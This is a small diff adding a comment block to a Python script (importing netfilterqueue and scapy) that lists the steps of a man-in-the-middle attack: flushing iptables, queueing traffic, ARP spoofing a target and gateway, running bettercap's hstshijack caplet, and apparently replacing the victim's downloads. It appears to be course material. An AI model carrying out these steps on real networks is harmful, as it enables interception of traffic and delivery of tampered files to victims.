@@ -1,5 +1,14 @@
 #!/usr/bin/env python3
 
+# Steps
+# 1. $ sudo service apache2 start
+# 2. $ sudo iptables -F
+# 3. $ sudo iptables -I INPUT -j NFQUEUE --queue-num 0
+# 4. $ sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
+# 5. $ sudo arp_spoof.py (with -t and -g set)
+# 6. $ sudo bettercap -caplet hstshijack/hstshijack
+# 7. $ sudo https_replace_downloads.py
+
 from struct import pack
 import netfilterqueue
 import scapy.all as scapy
